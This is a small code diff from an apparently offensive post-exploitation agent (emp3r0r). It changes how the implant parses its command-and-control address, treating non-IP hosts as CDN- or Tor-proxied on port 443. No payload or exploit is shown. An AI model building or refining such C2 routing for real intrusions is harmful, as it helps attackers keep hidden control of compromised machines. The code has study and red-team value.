@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent"
@@ -41,11 +42,12 @@ func main() {
 	}
 
 	// parse C2 address
-	if tun.IsTor2Web(agent.CCAddress) {
-		// xxx.onion.to/:port/...
-		agent.CCAddress = fmt.Sprintf("%s/:%s/", agent.CCAddress, agent.CCPort)
-	} else {
+	ccip := strings.Split(agent.CCAddress, "/")[2]
+	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
+	if tun.ValidateIP(ccip) {
 		agent.CCAddress = fmt.Sprintf("%s:%s/", agent.CCAddress, agent.CCPort)
+	} else {
+		agent.CCAddress += "/"
 	}
 connect:
 
